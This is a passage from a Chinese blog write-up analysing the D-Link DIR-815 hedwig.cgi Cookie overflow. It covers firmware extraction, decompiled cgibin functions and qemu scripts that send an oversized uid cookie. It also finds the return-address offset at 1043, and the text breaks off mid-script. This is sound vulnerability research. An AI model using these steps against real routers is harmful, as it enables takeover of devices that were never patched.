        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="D-Link-DIR-815-路由器多次溢出漏洞分析"><a href="#D-Link-DIR-815-路由器多次溢出漏洞分析" class="headerlink" title="D-Link DIR-815 路由器多次溢出漏洞分析"></a>D-Link DIR-815 路由器多次溢出漏洞分析</h2><ul><li><a href="https://www.exploit-db.com/exploits/33863">D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://c0ug4r.top/posts/book_notes_router_0day/">《揭秘家用路由器0day漏洞挖掘技术》漏洞分析笔记（一） :: Cougar — Blog (c0ug4r.top)</a></p><p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/">Building MIPS Environment for Router &amp;&amp; PWN (kirin-say.top)</a></p><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><ol><li><p>固件下载</p><ul><li><p>Google 搜索 DIR-815_FIRMWARE_1.01.ZIP</p><ul><li><a href="https://rebyte.me/en/d-link/89510/file-592084/">File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815 (rebyte.me)</a></li></ul></li><li><p>官方链接下载<code>ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.zip</code></p></li></ul></li><li><p>解压缩得到固件<code>DIR-815 FW 1.01b14_1.01b14.bin</code></p></li><li><p><code>binwalk -e DIR-815 FW 1.01b14_1.01b14.bin</code></p><ul><li><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;sasquatch -p 1 -be -d &#x27;%%squashfs-root%%&#x27; &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;sasquatch&#x27;: &#x27;sasquatch&#x27;</span><br></pre></td></tr></table></figure></li><li><p>解决：</p><ul><li><p>参考：<a href="https://blog.csdn.net/AS7062031/article/details/108036554"> binwalk 安装 与使用 xz_wrapper.h:50:2: error: unknown type name ‘lzma_vli’_AS7062031的博客-CSDN博客</a></p></li><li><p>```<br># Install sasquatch to extract non-standard SquashFS images<br>$ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev<br>$ git clone <a href="https://github.com/devttys0/sasquatch">https://github.com/devttys0/sasquatch</a><br>$ (cd sasquatch &amp;&amp; ./build.sh)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     - 安装报错`xz_wrapper.h:50:2: error: unknown type name ‘lzma_vli’`</span><br><span class="line"></span><br><span class="line">     - `cd squashfs-tools`，编辑`Makefile`以注释掉`XZ_SUPPORT = 1`行</span><br><span class="line"></span><br><span class="line">       ![image-20211026143705009](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026143705009.png)</span><br><span class="line"></span><br><span class="line">       然后尝试构建：注意此时不要直接`./build.sh`, 在`squashfs-tools`下`sudo make &amp;&amp; make install`</span><br><span class="line"></span><br><span class="line">   - 执行`binwalk -e DIR-815 FW 1.01b14_1.01b14.bin` 得到</span><br><span class="line"></span><br><span class="line">     ![image-20211026142843634](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026142843634.png)</span><br><span class="line"></span><br><span class="line">4. 该漏洞的核心组件为`/htdocs/web/hedwig.cgi`， 可以看到该组件是一个指向`/htdocs/cgibin`的符号链接</span><br><span class="line"></span><br><span class="line">   ![image-20211026143220423](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026143220423.png)</span><br><span class="line"></span><br><span class="line">### 漏洞分析</span><br><span class="line"></span><br><span class="line">![image-20211026143958015](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026143958015.png)</span><br><span class="line"></span><br><span class="line">根据漏洞公告可知漏洞产生原因是Cookie的值超长，通过`char *getenv(&quot;HTTP_COOKIE&quot;)`函数可以在CGI脚本中获取用户输入的Cookie值，因此将`cgibin`放入IDA中，在IDA中搜索`HTTP_Cookie`即可</span><br><span class="line"></span><br><span class="line">![image-20211026144215967](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144215967.png)</span><br><span class="line"></span><br><span class="line">根据交叉引用找到`sess_get_uid`函数</span><br><span class="line"></span><br><span class="line">![image-20211026144431917](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144431917.png)</span><br><span class="line"></span><br><span class="line">查看伪代码，确实通过`char *getenv(&quot;HTTP_COOKIE&quot;)`函数获得Cookie</span><br><span class="line"></span><br><span class="line">![image-20211026144623750](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144623750.png)</span><br><span class="line"></span><br><span class="line">继续查找交叉引用</span><br><span class="line"></span><br><span class="line">![image-20211026144714231](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144714231.png)</span><br><span class="line"></span><br><span class="line">在`hedwigcgi_main + 1C8`处的下方，存在危险函数`sprintf`</span><br><span class="line"></span><br><span class="line">![image-20211026144820180](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144820180.png)</span><br><span class="line"></span><br><span class="line">![image-20211026144923695](https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026144923695.png)</span><br><span class="line"></span><br><span class="line">初步分析该函数造成缓冲区溢出漏洞，为了验证是否是`0x409680`处的地址造成该溢出漏洞，采用动态调试进行验证</span><br><span class="line"></span><br><span class="line">在`sess_get_uid()`函数过程分析中发现多数sobj开头的函数，根据分析得到如下结构</span><br><span class="line"></span><br><span class="line">```assembly</span><br><span class="line">00000000 sobj            struc  # (sizeof=0x18, mappedto_7)</span><br><span class="line">00000000 field_0:        .word ?                  # offset</span><br><span class="line">00000004 field_4:        .word ?                  # offset</span><br><span class="line">00000008 field_8:        .word ?</span><br><span class="line">0000000C max_size:       .word ?</span><br><span class="line">00000010 used_size:      .word ?</span><br><span class="line">00000014 string:         .word ?                  # offset</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol><p><strong>sobj_new() 申请一个新的字符串结构</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">sobj *<span class="title">sobj_new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sobj *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  result = (sobj *)<span class="built_in">malloc</span>(<span class="number">0x18</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result-&gt;field_8 = <span class="number">0</span>;<span class="comment">// 未知, 但根据free可知应该与该结构的字符串有关</span></span><br><span class="line">    result-&gt;max_size = <span class="number">0</span>;                       <span class="comment">// 该结构的字符串最大长度</span></span><br><span class="line">    result-&gt;used_size = <span class="number">0</span>;                      <span class="comment">// 该结构已使用的字节数(不包括&#x27;\0&#x27;)</span></span><br><span class="line">    result-&gt;<span class="built_in">string</span> = <span class="number">0</span>;                         <span class="comment">// 放该结构的字符串堆块的地址</span></span><br><span class="line">    result-&gt;field_4 = result;                   <span class="comment">// 放该结构的首地址</span></span><br><span class="line">    result-&gt;field_0 = result;                   <span class="comment">// 放该结构的首地址</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_free() 将该字符串结构中的字符串删除</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_free</span><span class="params">(sobj *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">      <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">    a1-&gt;field_8 = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;max_size = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;used_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_add_char 向该字符串结构追加一个新字符</strong> </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_add_char</span><span class="params">(sobj *a1, <span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> used_size; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || a1-&gt;max_size == a1-&gt;used_size &amp;&amp; sobj_resize(a1) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  used_size = a1-&gt;used_size;</span><br><span class="line">  a1-&gt;<span class="built_in">string</span>[used_size] = ch;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  a1-&gt;used_size = used_size + <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">string</span>[used_size + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_resize 该函数地址在0x0040E864, 分析可知该函数功能：</strong></p><ol><li><strong>如果已申请字符串空间则增加33字节的空间</strong> </li><li><strong>如果未申请字符串空间则申请一个33字节的空间</strong></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_resize</span><span class="params">(sobj *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line">  <span class="keyword">int</span> max_size; <span class="comment">// $a1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    max_size = a1-&gt;max_size;</span><br><span class="line">    a1-&gt;max_size = max_size + <span class="number">32</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(<span class="built_in">string</span>, max_size + <span class="number">33</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;max_size = <span class="number">32</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1-&gt;<span class="built_in">string</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_strcmp 将字符串结构中的字符串与给定字符串进行对比, 如果当前字符串结构的字符串空间未申请，则拿空字符与给定字符串对比</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_strcmp</span><span class="params">(sobj *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">string</span> )</span><br><span class="line">    <span class="built_in">string</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="built_in">string</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_get_string 获得字符串结构中的字符串</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *__fastcall sobj_get_string(sobj *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *string; // $v1</span><br><span class="line"></span><br><span class="line">  string = 0;</span><br><span class="line">  if ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    string = a1-&gt;string;</span><br><span class="line">    if ( !string )</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  return string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_add_string 向字符串结构追加新的字符串</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sobj_add_string</span><span class="params">(sobj *a1, <span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">size_t</span> str_len; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> used_size; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( str )</span><br><span class="line">  &#123;</span><br><span class="line">    str_len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span> ( str_len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        used_size = a1-&gt;used_size;</span><br><span class="line">        <span class="keyword">if</span> ( a1-&gt;max_size - used_size &gt;= str_len )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6 = sobj_resize(a1);</span><br><span class="line">        v4 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;a1-&gt;<span class="built_in">string</span>[used_size], str);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      a1-&gt;used_size += str_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sobj_del 删除字符串结构</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sobj_del</span><span class="params">(sobj *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">      <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">free</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sess_get_uid()</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sess_get_uid</span><span class="params">(sobj *cookie)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sobj *key_sobj; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// $v0</span></span><br><span class="line">  sobj *value_sobj; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">char</span> *http_cookie; <span class="comment">// $s4</span></span><br><span class="line">  <span class="keyword">int</span> status; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> current_char; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  key_sobj = sobj_new();</span><br><span class="line">  value_sobj = sobj_new();</span><br><span class="line">  v3 = getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !key_sobj )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !value_sobj )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  http_cookie = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  status = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    current_char = *http_cookie;</span><br><span class="line">    <span class="keyword">if</span> ( !*http_cookie )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( status == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( status &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( current_char == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(key_sobj);</span><br><span class="line">      sobj_free(value_sobj);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( current_char == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        status = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        status = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( current_char != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(key_sobj, current_char);</span><br><span class="line">          status = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( status == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( current_char == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        status = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(value_sobj, *http_cookie++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(key_sobj, <span class="string">&quot;uid&quot;</span>) )      <span class="comment">// 找到uid键值对</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++http_cookie;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(key_sobj, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(value_sobj);       <span class="comment">// 将cookie中uid键值对中的value提取到string中</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  sobj_add_string(cookie, <span class="built_in">string</span>);              <span class="comment">// 将string追加到cookie中</span></span><br><span class="line">  <span class="keyword">if</span> ( key_sobj )</span><br><span class="line">    sobj_del(key_sobj);</span><br><span class="line">  <span class="keyword">if</span> ( value_sobj )</span><br><span class="line">    sobj_del(value_sobj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，Cookie的形式为<code>uid=payload</code>才会被程序接受</p><p>分析上层函数<code>hedwigcgi_main()</code>, 请求方式只支持POST</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026162012256.png" alt="image-20211026162012256"></p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>根据上述漏洞分析，我们首先需要确定偏移量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -c -l 2000 -f test</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[+] output to test ok!</span><br><span class="line">[+] take time: 0.0016 s</span><br></pre></td></tr></table></figure><p>程序通过getenv的方式获取HTTP数据包中的数据，流程应该为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主Web程序监听端口-&gt;传送HTTP数据包-&gt;</span><br><span class="line">HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;</span><br><span class="line">cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</span><br><span class="line">#POST具体数据可以通过类似输入流传入 ：echo &quot;uid=aaa&quot;| /htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure><p><strong>因此，动态调试时只需要使用qemu -E设置环境变量或者在mips系统中export设置环境变量并允许程序即可模拟Web场景</strong></p><p><strong>动调测试脚本 test.sh</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>=$(python -c <span class="string">&quot;print &#x27;uid=&#x27;+open(&#x27;test&#x27;,&#x27;r&#x27;).read(2000)&quot;</span>)</span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$test</span>&quot;</span> | wc -c)</span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line">sudo chroot . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E HTTP_COOKIE=<span class="variable">$test</span> -E REQUEST_URL=<span class="string">&quot;/hedwig.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi 2&gt;/dev/null</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>在<code>squashfs-root</code>目录下执行<code>./test.sh</code></p><p>在<code>.text:00409A28 lw $ra, 0x4E8+var_4($sp)</code>指令执行完后：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026163037652.png" alt="image-20211026163037652"></p><p>计算偏移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x38694237 -l 2000</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 1043 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure><p>然而在这个漏洞点后还有一个<code>sprintf</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026165144077.png" alt="image-20211026165144077"></p><p>这里同样是取uid的值进行格式化输出，且<strong>如果执行成功会覆盖前面的结果，则偏移会发生变化</strong>。那么我们就需要查看如何触发到该漏洞点</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026165412993.png" alt="image-20211026165412993"></p><p>如果<code>fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)</code>打开成功则会执行到第二个<code>sprintf</code>，因为没有实机没法判断实际固件中是否有这个目录</p><blockquote><p>根据书中的描述，可以通过给路由器发包查看返回结果来确认是否存在该文件，而根据书中的测试，实际路由器中是存在有这个目录文件的</p></blockquote><p>因此我们手动创建该目录及文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root mkdir var/tmp</span><br><span class="line">➜  squashfs-root touch var/tmp/temp.xml</span><br><span class="line">➜  squashfs-root ls var/tmp</span><br><span class="line">temp.xml</span><br></pre></td></tr></table></figure><p>继续测试发现如果下方haystack为0，无法走到第二个漏掉点</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026170042613.png" alt="image-20211026170042613"></p><p>查找交叉引用，haystack是下方这个函数进行赋值的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_409A6C</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  result = sobj_strdup(*(sobj **)(a2 + <span class="number">4</span>));</span><br><span class="line">  haystack = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而该函数在此处进行调用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026170218998.png" alt="image-20211026170218998"></p><p>进入该函数，此处根据我们传入的<code>CONTENT_TYPE</code>进行函数的调用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026172555088.png" alt="image-20211026172555088"></p><p><strong>types_funcs：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026172614546.png" alt="image-20211026172614546"></p><p><strong>node结构</strong>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 node            struc  # (sizeof=0xC, mappedto_8)</span><br><span class="line">00000000                                          # XREF: .data.rel.ro:types_funcs/r</span><br><span class="line">00000000 string_name:    .word ?                  # offset</span><br><span class="line">00000004 string_len:     .word ?</span><br><span class="line">00000008 func:           .word ?                  # offset</span><br><span class="line">0000000C node            ends</span><br><span class="line">0000000C</span><br></pre></td></tr></table></figure><p>分析我们传入的参数，可知调用为<code>sub_403B10</code>函数</p><p>进入<code>sub_403B10</code>函数继续调试， 跟进<code>sub_402B40</code></p><ul><li> 这里需要说明一下v16，应该是一个结构体，包含了我们传进来的函数指针</li><li>而且<code>sub_402B40</code>传入的也是v16的地址，及该结构体的指针</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185213761.png" alt="image-20211026185213761"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185039375.png" alt="image-20211026185039375"></p><p>进入<code>sub_402B40</code>函数，只要<code>a1 + 4</code>不为空即可调用<code>sub_409A6C</code>对<code>haystack</code>进行赋值</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185501362.png" alt="image-20211026185501362"></p><p>分析这部分前面的代码，可知随便传点参数即可</p><blockquote><p>查看别人的分析都说需要传入带uid的字段，不是很理解如何分析到的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185648146.png" alt="image-20211026185648146"></p><p>则根据上述分析可以修改我们的动调脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> test2.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo ./test2.sh  <span 